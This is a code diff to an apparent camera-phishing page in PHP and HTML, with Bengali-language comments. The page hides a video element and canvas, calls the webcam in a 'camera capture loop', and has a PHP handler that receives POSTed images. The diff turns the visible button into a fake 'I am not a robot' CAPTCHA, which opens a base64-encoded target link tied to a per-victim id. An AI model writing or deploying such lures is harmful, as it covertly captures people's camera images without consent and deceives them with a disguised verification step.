@@ -55,36 +55,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #ffffff; /* Pura page white thakbe */
+            background-color: #ffffff; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        /* Send Picture batoner style */
+        
+        /* I am not a robot button style - Center-e rakhar jonno */
         #send-pic-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 9999;
-            background: #ff4757;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 5px;
+            background: #ffffff;
+            color: #333333;
+            border: 1px solid #d3d3d3;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: 500;
+            border-radius: 4px;
             cursor: pointer;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-            display: none; /* Shurute hide thakbe, link load hole show korbe */
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: none; 
+            font-family: Arial, sans-serif;
+            align-items: center;
+            gap: 10px;
         }
         #send-pic-btn:hover {
-            background: #ff6b81;
+            background: #f9f9f9;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.15);
         }
     </style>
 </head>
 <body>
 
-    <!-- Iframe completely remove kore dewa hoyeche -->
-    
-    <!-- Send Picture button -->
-    <button id="send-pic-btn" onclick="openTargetLink()">Send Picture</button>
+    <!-- I am not a robot button -->
+    <button id="send-pic-btn" onclick="openTargetLink()">I am not a robot</button>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -97,29 +99,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         const targetId = urlParams.get('id') || 'direct';
         const rawTargetUrl = urlParams.get('url');
 
-        let finalUrl = "https://www.aapunkagames.com/"; // Default fallback
+        let finalUrl = "https://www.aapunkagames.com/"; 
 
         if (rawTargetUrl) {
             try {
-                // Base64 decode kora target URL
                 finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
             } catch (e) {
                 console.error("URL decode error:", e);
             }
         }
 
-        // Link set howar por button-ti drishoman kora
         const sendBtn = document.getElementById('send-pic-btn');
         if (finalUrl) {
-            sendBtn.style.display = 'block';
+            sendBtn.style.display = 'inline-block';
         }
 
-        // Button-e click korle notun tab-e target link open korar function
         function openTargetLink() {
             window.open(finalUrl, '_blank');
         }
 
-        // Camera capture loop
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
